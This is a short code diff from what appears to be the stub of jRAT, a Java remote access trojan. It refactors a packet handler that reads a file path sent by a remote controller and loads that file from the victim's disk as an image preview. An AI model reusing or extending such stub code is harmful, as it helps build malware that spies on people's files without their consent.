@@ -11,7 +11,7 @@ import se.jrat.stub.packets.outgoing.Packet43PreviewImage;
 public class Packet62PreviewImage extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String file = Connection.instance.readLine();
 
 		BufferedImage image = ImageIO.read(new File(file));
